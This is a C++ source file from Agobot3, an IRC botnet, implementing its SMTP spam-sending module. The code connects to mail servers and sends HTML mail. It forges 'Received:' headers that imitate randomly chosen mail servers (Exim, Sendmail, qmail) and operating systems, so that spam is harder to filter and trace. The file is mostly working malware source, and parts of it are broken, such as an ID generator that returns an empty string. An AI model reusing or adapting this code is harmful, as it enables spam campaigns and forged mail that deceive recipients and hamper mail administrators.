/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "smtp.h"
#include "smtp_logic.h"

//
// SMTP Connection class
//

// gaia:
// Received: from gaia ([207.253.117.144]) by sims-ha.videotron.net (Sun Internet Mail Server sims.3.5.1998.03.08.20.27) with ESMTP id <0F9P00H8ODH1J0@sims-ha.videotron.net> for submit@bugs.debian.org; Mon,  5 Apr 1999 02:17:26 -0400 (EDT)
// Received: from gaia (localhost) [127.0.0.1] (linh) by gaia with esmtp (Exim 2.11 #1 (Debian)) id 10Tywy-00049x-00; Mon, 05 Apr 1999 02:17:20 +0000

// microsoft smtpsvc:
// Received: from mail pickup service by hotmail.com with Microsoft SMTPSVC; Thu, 1 Aug 2002 05:49:48 -0700

// microsoft exchange:
// Received: from server.ABGLtd.Co.Uk (host217-35-80-92.in-addr.btopenworld.com [217.35.80.92]) by mail.vapor.com (Postfix) with ESMTP id 327B39B0AB for <amirc@vapor.com>; Wed, 17 Jul 2002 12:40:08 +0200 (CEST)
// Received: from server.ABGLtd.Co.Uk (SERVER [10.0.0.2]) by server.ABGLtd.Co.Uk with SMTP (Microsoft Exchange Internet Mail Service Version 5.5.2653.13) id 30MJ8W5G; Wed, 17 Jul 2002 11:15:53 +0100
// Received: by server.ABGLtd.Co.Uk (Microsoft Exchange Connector for POP3 Mailboxes 4.50.2113) with SMTP (Global POP3 Download) id MSG07172002-111530-521.MMD@ABGLtd.Co.Uk; Wed, 17 Jul 2002 11:15:30 +0100

// hotmail http webmail
// Received: from 216.229.92.162 by lw8fd.law8.hotmail.msn.com with HTTP; Thu, 01 Aug 2002 12:49:48 GMT

// http webmail
// Received: from 206.243.191.252 ( [206.243.191.252]) as user chuck@localhost by marina.horde.org with HTTP; Fri,  6 Apr 2001 10:06:03 -0400

// smtpd:
// Received: from mail.vapor.com [195.8.247.1] by skmail1.sksl.com (SMTPD32-7.05) id A11E821039E; Wed, 17 Jul 2002 11:04:14 +0100

// postfix:
// Received: by marina.horde.org (Postfix, from userid 33) id 75C823CA4; Fri,  6 Apr 2001 10:06:03 -0400 (EDT)
// Received: from water.vapor.com (localhost [127.0.0.1]) by mail.vapor.com (Postfix) with ESMTP id D50CC9B0B3; Wed, 17 Jul 2002 12:30:18 +0200 (CEST)

// list amirc
// Received: with LISTAR (v1.0.0; list amirc); Wed, 17 Jul 2002 12:30:17 +0200 (CEST)
// Received: from mta06-svc.ntlworld.com (mta06-svc.ntlworld.com [62.253.162.46]) by mail.vapor.com (Postfix) with ESMTP id 727EA9B0AB for <amirc@vapor.com>; Wed, 17 Jul 2002 12:30:00 +0200 (CEST)
// Received: from ntlworld.com ([62.252.144.85]) by mta06-svc.ntlworld.com (InterMail vM.4.01.03.27 201-229-121-127-20010626) with SMTP id <20020717100614.FIZI4119.mta06-svc.ntlworld.com@ntlworld.com> for <amirc@vapor.com>; Wed, 17 Jul 2002 11:06:14 +0100

// ???
// Received: from faure.videotron.net (HELO sims-ha.videotron.net) (205.151.222.100) by master.debian.org with SMTP; 5 Apr 1999 06:21:30 -0000
// Received: by ctpa01.mit.edu; id AA05604; Wed, 3 May 1995 12:13:50 -0400
// Received: from sun2.nsfnet-relay.ac.uk by MIT.EDU with SMTP id AA15082; Wed, 3 May 95 12:12:44 EDT
// Received: from user-24-214-63-14.knology.net (HELO smtp2.knology.net) (qmailr@24.214.63.14) by mx.rollanet.org with SMTP; 9 Jun 2001 18:59:25 -0000
// Received: from user-24-214-89-140.knology.net (HELO compaqcomputer) (24.214.89.140) by user-24-214-63-14.knology.net with SMTP; 9 Jun 2001 18:59:24 -0000
// Received: from f58.law8.hotmail.com (HELO hotmail.com) (216.33.241.58) by mx.rollanet.org with SMTP; 1 Aug 2002 12:50:15 -0000
// Received: from localhost (HELO werlax.loopyboy.com) (127.0.0.1) by 0 with SMTP; 17 Jul 2002 15:29:25 -0000
// Received: from sclp3.sclp.com (209.196.61.66) by 0 with SMTP; 17 Jul 2002 14:31:12 -0000
// Received: from nat1.advantive.com (HELO advantive.com) (204.252.125.74) by libertine.org with SMTP; 17 Jul 2002 14:30:10 -0000
// Received: from unknown (HELO SPAIR) (spair@66.32.85.22) by citrus.advantive.com with SMTP; 17 Jul 2002 14:30:08 -0000
// Received: from 208-59-250-206.c3-0.smr-ubr1.sbo-smr.ma.cable.rcn.com (HELO marina.horde.org) (208.59.250.206) by horde.org with SMTP; 6 Apr 2001 14:07:14 -0000

// Message-Id: <9505031612.AA15082_at_MIT.EDU>

// Via: uk.ac.rutherford.ibm-b; Wed, 3 May 1995 13:29:23 +0100

// MIME-Version: 1.0

// Content-Type: multipart/alternative; boundary="----=_NextPart_000_0007_01C0F0EC.7C2017C0"

// Precedence: bulk

// X-Priority: 3
// X-MSMail-Priority: Normal
// X-Mailer: Microsoft Outlook Express 5.50.4522.1200
// X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200
// X-OriginalArrivalTime: 01 Aug 2002 12:49:48.0668 (UTC) FILETIME=[EB8EEBC0:01C23959]
// X-Spam-Status: No, hits=1.0 required=5.0 tests=FROM_ENDS_IN_NUMS version=2.21
// X-Spam-Level: *
// X-Originating-IP: [216.229.92.162]

//extern CSMTP_Logic g_cSMTPLogic;

CSMTP_Connection::CSMTP_Connection() {
	// Clear server socket  and reset values
	m_sServerSocket=SOCKET_ERROR; m_bConnected=false; m_bUseSMTPExt=false;
	m_iMTAType=brandom(MTA_TYPE_UNKNOWN, MTA_TYPE_QMAIL);
}

CSMTP_Connection::~CSMTP_Connection() {
	// Disconnect if connected
	Disconnect();
}

void CSMTP_Connection::Init() {
	// Disconnect if connected and reset values
	Disconnect(); m_sServerSocket=SOCKET_ERROR; m_bUseSMTPExt=false;
	m_iMTAType=brandom(MTA_TYPE_UNKNOWN, MTA_TYPE_QMAIL);
}

bool CSMTP_Connection::Connect(CString sHost, int iPort) {
	// Fail if already connected
	if(m_sServerSocket.IsConnected() || m_bConnected) return false;

	// Connect to the server
	if(!m_sServerSocket.Connect(sHost.CStr(), iPort)) {
		// Connection failed
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Failed to connect to \"%s:%d\"!\n", this,
			sHost.CStr(), iPort);
#endif // DBGCONSOLE
		return false;
	}

	// Store server address in member variables
	m_sServerHost.Assign(sHost); m_iServerPort=iPort;

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(3, "CSMTP_Connection(0x%8.8Xh): "
		"Connected to \"%s:%d\"!\n", this,
		m_sServerHost.CStr(), m_iServerPort);
#endif // DBGCONSOLE

	// Receive banner
	CString sRecvBuf;
	if(!m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192)) {
		// Connection reset
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Connection reset!\n", this);
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Check if connection was accepted
	if(sRecvBuf.Mid(0, 3).Compare("220")) {
		// Connection not accepted
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected connection!\n", this);
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Set connection status to true and return true
	m_bConnected=true; return true;
}

bool CSMTP_Connection::Disconnect() {
	// Fail if not connected
	if(!m_sServerSocket.IsConnected()) return false;

	// Send QUIT command
	CString sReqBuf; sReqBuf.Format("QUIT\r\n");
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(3, "CSMTP_Connection(0x%8.8Xh): "
		"Disconnecting from \"%s:%d\"!\n", this,
		m_sServerHost.CStr(), m_iServerPort);
#endif // DBGCONSOLE

	// Close socket and reset variables
	m_sServerSocket.Disconnect();
	m_sServerHost.Assign(""); m_iServerPort=0; m_bConnected=false;
	return true;
}

CString GenerateID() {
	// E1AOkjD-0001RE-00

	CString sID; sID.Assign("       -      -  ");

	for(int i=0; i<7; i++) {
		int iType=brandom(1,3); switch(iType) {
			case 1:
				// Uppercase letter
				sID[i]=brandom(65, 90);
				break;
			case 2:
				// Lowercase letter
				sID[i]=brandom(97, 122);
				break;
			case 3:
				// Number
				sID[i]=brandom(48, 57);
				break;
		}
	}

	for(i=8; i<12; i++) {
		// Number
		sID[i]=brandom(48, 57);
	}

	for(i=12; i<14; i++) {
		// Uppercase letter
		sID[i]=brandom(65, 90);
	}

	for(i=15; i<17; i++) {
		// Number
		sID[i]=brandom(48, 57);
	}

	return CString("");
}

bool CSMTP_Connection::Hello() {
	CString sReqBuf; CString sRecvBuf; CString sHost;

	// Get local hostname
	sHost.Assign(g_pMainCtrl->m_cIRC.m_sLocalHost.CStr());
	
	// Send EHLO command
	sReqBuf.Format("EHLO %s\r\n", sHost.CStr());
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

	// Receive reply
	if(!m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192)) {
		// Connection reset
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Connection reset!\n", this);
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Check if EHLO was accepted
	if(sRecvBuf.Mid(0, 3).Compare("250")) {
		// EHLO not accepted, try HELO (no ESMTP)
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected EHLO, disabling SMTP extensions!\n", this);
#endif // DBGCONSOLE

		// Send HELO command
		sReqBuf.Format("HELO %s\r\n", sHost.CStr());
		m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

		// Receive reply
		if(!m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192)) {
			// Connection reset
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
				"Connection reset!\n", this);
#endif // DBGCONSOLE
			Disconnect(); return false;
		}

		// Check if HELO was accepted
		if(sRecvBuf.Mid(0, 3).Compare("250")) {
			// HELO not accepted
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
				"Server rejected HELO!\n", this);
#endif // DBGCONSOLE
			Disconnect(); return false;
		}

		// HELO accepted, disable ESMTP and return true
		m_bUseSMTPExt=false; return true;
	}

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
		"Enabled SMTP extensions!\n", this);
#endif // DBGCONSOLE

	// EHLO accepted, enable ESMTP and return true
	m_bUseSMTPExt=true; return true;
}

bool CSMTP_Connection::Mail(CString sMailFrom, CString sMailFromFull, 
							CString sRcptTo, CString sSubject, CString sData) {
	CString sReqBuf, sRecvBuf, sHost, sSrcID, sMTA, sOS;

	init_random();

	m_iMTAType=brandom(MTA_TYPE_UNKNOWN, MTA_TYPE_QMAIL);

	switch(brandom(1,5)) {
	case 1:
		sOS.Assign("Debian"); break;
	case 2:
		sOS.Assign("RedHat"); break;
	case 3:
		sOS.Assign("SuSE"); break;
	case 4:
		sOS.Assign("Slackware"); break;
	case 5:
		sOS.Assign("FreeBSD"); break;
	default:
		sOS.Assign("Unknown"); break; }

	switch(m_iMTAType) {
	case MTA_TYPE_UNKNOWN:
		{	CString sVersionHigh, sVersionLow, sNumber;
			sVersionHigh.Assign(brandom(3, 4)); sVersionLow.Assign(brandom(1, 40));

			sMTA.Format("SMTP %s.%s (%s)",
				sVersionHigh.CStr(), sVersionLow.CStr(), sOS.CStr()); }
		break;
	case MTA_TYPE_EXIM:
		{	CString sVersionHigh, sVersionLow, sNumber;
			sVersionHigh.Assign(brandom(3, 4)); sVersionLow.Assign(brandom(1, 40)); sNumber.Assign(brandom(1, 5));

			sMTA.Format("Exim %s.%s #%s (%s)",
				sVersionHigh.CStr(), sVersionLow.CStr(), sNumber.CStr(), sOS.CStr()); }
		break;
	case MTA_TYPE_SENDMAIL:
		{	CString sVersionHigh, sVersionLow, sVersionLow2;
			sVersionHigh.Assign(brandom(1, 12)); sVersionLow.Assign(brandom(1, 10));
			sVersionLow2.Assign(brandom(1, 10));

			sMTA.Format("8.%s.%s/8.%s.%s",
				sVersionHigh.CStr(), sVersionLow.CStr(), sVersionHigh.CStr(), sVersionLow2.CStr()); }
		break;
	case MTA_TYPE_QMAIL:
		{	CString sPid; sPid.Assign(brandom(1, 65000));
			CString sInvokedBy; int iInvokedBy=brandom(1,3);
			if(iInvokedBy==1) {
				sInvokedBy.Assign("alias");
			} else if(iInvokedBy==2) {
				sInvokedBy.Assign("network");
			} else if(iInvokedBy==3) {
				sInvokedBy.Assign("uid 0");
			}

			sMTA.Format("qmail %s invoked by %s",
				sPid.CStr(), sInvokedBy.CStr()); }
		break;
	case MTA_TYPE_GAIA:
		break;
	case MTA_TYPE_MSSMTPSVC:
		break;
	case MTA_TYPE_MSEXCHANGE:
		break;
	case MTA_TYPE_HOTMAILWM:
		break;
	case MTA_TYPE_WEBMAIL:
		break;
	case MTA_TYPE_POSTFIX:
		break;
	case MTA_TYPE_SMTPD:
		break;
	case MTA_TYPE_LIST_AMIRC:
		break;
	default:
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
				"Invalid MTA type selected!\n", this);
#endif // DBGCONSOLE
			Disconnect(); return false;
		break; }

	// Generate an ID
	CString sID=GenerateID(); sSrcID.Assign(sID);

	// Get local hostname
	sHost.Assign(g_pMainCtrl->m_cIRC.m_sLocalHost.CStr());

	// Send MAIL FROM command
	sReqBuf.Format("MAIL FROM:<%s>\r\n", sMailFrom.CStr());
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

	// Receive reply
	m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192);
	if(sRecvBuf.Mid(0, 3).Compare("250")) {
		// MAIL FROM failed
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected MAIL FROM \"%s\" (\"%s\")!\n", this,
			sMailFrom.CStr(), sRecvBuf.Token(0, "\r").CStr());
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Send RCPT TO command
	sReqBuf.Format("RCPT TO:<%s>\r\n", sRcptTo.CStr());
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

	// Receive reply
	m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192);
	if(sRecvBuf.Mid(0, 3).Compare("250")) {
		// RCPT TO failed
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected RCTP TO \"%s\" (\"%s\")!\n", this,
			sRcptTo.CStr(), sRecvBuf.Token(0, "\r").CStr());
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Send DATA command
	sReqBuf.Format("DATA\r\n");
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

	// Receive reply
	m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192);
	if(sRecvBuf.Mid(0, 3).Compare("354")) {
		// DATA failed
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected DATA (\"%s\")!\n", this,
			sRecvBuf.Token(0, "\r").CStr());
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Get local time
	time_t tGlobal=time(NULL); char szTimeBuf[4096];
	strftime(szTimeBuf, sizeof(szTimeBuf), "%a, %d %b %Y %H:%M:%S GMT", gmtime(&tGlobal));

	// Clear buffer
	sReqBuf.Assign("");
	switch(m_iMTAType) {
	case MTA_TYPE_UNKNOWN:
			sReqBuf.Append("Received: from "); sReqBuf.Append(sMailFrom.Token(0, "@").CStr()); sReqBuf.Append(" by ");
			sReqBuf.Append(sHost.CStr()); sReqBuf.Append(" with local\r\n");
			if(m_bUseSMTPExt) {
				// id 1AOkjD-0001RE-00
				sReqBuf.Append("\tid "); sReqBuf.Append(sSrcID.Mid(1)); sReqBuf.Append("\r\n");
				// for <xxxx@xxxx.xxxx.xxx.xxx>; Tue, 25 Nov 2003 22:28:12 +0100
				sReqBuf.Append("\tfor <"); sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">; ");
				sReqBuf.Append(szTimeBuf); sReqBuf.Append("\r\n");
				// Message-Id: <E1AOkjD-0001RE-00@xxxxx.xxxxxxx.xxx>
				sReqBuf.Append("Message-Id: <"); sReqBuf.Append(sSrcID.CStr()); sReqBuf.Append("@");
				sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">\r\n");
			}
		break;
	case MTA_TYPE_EXIM:
			// Received: from xxxx by xxxxx.xxxxxxx.xxx with local (Exim 3.36 #1 (Debian))
			sReqBuf.Append("Received: from "); sReqBuf.Append(sMailFrom.Token(0, "@").CStr()); sReqBuf.Append(" by ");
			sReqBuf.Append(sHost.CStr()); sReqBuf.Append(" with local ("); sReqBuf.Append(sMTA.CStr()); sReqBuf.Append(")\r\n");
			if(m_bUseSMTPExt) {
				// id 1AOkjD-0001RE-00
				sReqBuf.Append("\tid "); sReqBuf.Append(sSrcID.Mid(1)); sReqBuf.Append("\r\n");
				// for <xxxx@xxxx.xxxx.xxx.xxx>; Tue, 25 Nov 2003 22:28:12 +0100
				sReqBuf.Append("\tfor <"); sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">; ");
				sReqBuf.Append(szTimeBuf); sReqBuf.Append("\r\n");
				// Message-Id: <E1AOkjD-0001RE-00@xxxxx.xxxxxxx.xxx>
				sReqBuf.Append("Message-Id: <"); sReqBuf.Append(sSrcID.CStr()); sReqBuf.Append("@");
				sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">\r\n");
			}
		break;
	case MTA_TYPE_SENDMAIL:
			// Received: from xxxx by xxxx.xxxxxxx.xxx (8.12.8p1/8.12.6) with local
			sReqBuf.Append("Received: from "); sReqBuf.Append(sMailFrom.Token(0, "@").CStr()); sReqBuf.Append(" by ");
			sReqBuf.Append(sHost.CStr()); sReqBuf.Append("(8."); sReqBuf.Append(sMTA.CStr()); sReqBuf.Append(") with local\r\n");
			if(m_bUseSMTPExt) {
				// id 1AOkjD-0001RE-00
				sReqBuf.Append("\tid "); sReqBuf.Append(sSrcID.Mid(1)); sReqBuf.Append("\r\n");
				// for <xxxx@xxxx.xxxx.xxx.xxx>; Tue, 25 Nov 2003 22:28:12 +0100
				sReqBuf.Append("\tfor <"); sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">; ");
				sReqBuf.Append(szTimeBuf); sReqBuf.Append("\r\n");
				// Message-Id: <E1AOkjD-0001RE-00@xxxxx.xxxxxxx.xxx>
				sReqBuf.Append("Message-Id: <"); sReqBuf.Append(sSrcID.CStr()); sReqBuf.Append("@");
				sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append(">\r\n");
			}
		break;
	case MTA_TYPE_QMAIL:
			// Received: (qmail 21608 invoked by alias); 17 Jul 2002 14:30:10 -0000
			sReqBuf.Append("Received: ("); sReqBuf.Append(sMTA.CStr()); sReqBuf.Append("); ");
			sReqBuf.Append(szTimeBuf); sReqBuf.Append("\r\n");
		break;
	case MTA_TYPE_GAIA:
		break;
	case MTA_TYPE_MSSMTPSVC:
		break;
	case MTA_TYPE_MSEXCHANGE:
		break;
	case MTA_TYPE_HOTMAILWM:
		break;
	case MTA_TYPE_WEBMAIL:
		break;
	case MTA_TYPE_POSTFIX:
		break;
	case MTA_TYPE_SMTPD:
		break;
	case MTA_TYPE_LIST_AMIRC:
		break;
	}

	// From: xxxx <xxxx@xxx.xxxx.xxx.xxx>
	sReqBuf.Append("From: "); sReqBuf.Append(sMailFromFull.CStr()); sReqBuf.Append(" <");
	sReqBuf.Append(sMailFrom.CStr()); sReqBuf.Append(">\r\n");
	// To: xxxx@xxxx.xxxx.xxx.xxx
	sReqBuf.Append("To: "); sReqBuf.Append(sRcptTo.CStr()); sReqBuf.Append("\r\n");
	// Subject: bla
	sReqBuf.Append("Subject: "); sReqBuf.Append(sSubject.CStr()); sReqBuf.Append("\r\n");
	// Date: Tue, 25 Nov 2003 22:28:12 +0100
	sReqBuf.Append("Date: "); sReqBuf.Append(szTimeBuf); sReqBuf.Append("\r\n");
	// MIME-Version: 1.0
	sReqBuf.Append("MIME-Version: 1.0\r\n");
//	if(g_cSMTPLogic.spam_htmlemail.bValue) {
		// Content-Type: text/html; charset=us-ascii
		sReqBuf.Append("Content-Type: text/html; charset=us-ascii\r\n");
//	} else {
//		// Content-Type: text/plain; charset=us-ascii
//		sReqBuf.Append("Content-Type: text/plain; charset=us-ascii\r\n");
//	}
	sReqBuf.Append("Content-Type: text/html; charset=us-ascii\r\n");
	// Content-Transfer-Encoding: 7bit
	sReqBuf.Append("Content-Transfer-Encoding: 7bit\r\n");
	// 
	// <data>
	// .
//	if(g_cSMTPLogic.spam_htmlemail.bValue) {
		sReqBuf.Append("\r\n\r\n");
//	} else {
//		sReqBuf.Append("\r\n");
//	}
	sReqBuf.Append("\r\n\r\n");
	sReqBuf.Append(sData.CStr()); sReqBuf.Append("\r\n.\r\n");

	// Send data
	m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

	// Receive reply
	if(!m_sServerSocket.Recv(sRecvBuf.GetBuffer(8192), 8192)) {
		// Connection reset
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Connection reset!\n", this);
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	// Check if data was accepted
	if(sRecvBuf.Mid(0, 3).Compare("250")) {
		// Data not accepted
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(7, "CSMTP_Connection(0x%8.8Xh): "
			"Server rejected MAIL FROM \"%s\", RCPT TO \"%s\"!\n", this,
			sMailFrom.CStr(), sRcptTo.CStr());
#endif // DBGCONSOLE
		Disconnect(); return false;
	}

	return true;
}

void CSMTP_Connection::SetMTA(int iMTAType) {
	m_iMTAType=iMTAType;
}

//
// SMTP Sender class
//

CSMTP_Sender::CSMTP_Sender() {
	m_szType="CSMTP_Sender";
	m_sMailFrom.Assign(""); m_sMailFromFull.Assign("");
	m_sRcptTo.Assign(""); m_sData.Assign("");
	m_sHost.Assign(""); m_iPort=0;
	m_cConnection.Init(); m_bFinished=true;
}

CSMTP_Sender::~CSMTP_Sender() {
	m_cConnection.Disconnect(); m_bFinished=true;
}

void *CSMTP_Sender::Run() {
	m_bFinished=false;
	if(m_cConnection.Connect(m_sHost, m_iPort)) {
		if(m_cConnection.Hello()) {
			if(m_cConnection.Mail(m_sMailFrom, m_sMailFromFull, m_sRcptTo, m_sSubject, m_sData)) {
				m_cConnection.Disconnect();
			}
		}
		m_cConnection.Disconnect();
	}
	m_bFinished=true;
	return NULL;
}

void CSMTP_Sender::SetMail(CString sMailFrom, CString sMailFromFull, CString sRcptTo, CString sSubject, CString sData) {
	m_sMailFrom.Assign(sMailFrom); m_sMailFromFull.Assign(sMailFromFull);
	m_sRcptTo.Assign(sRcptTo); m_sSubject.Assign(sSubject); m_sData.Assign(sData);
}

void CSMTP_Sender::SetServer(CString sHost, int iPort) {
	m_sHost.Assign(sHost); m_iPort=iPort;
}

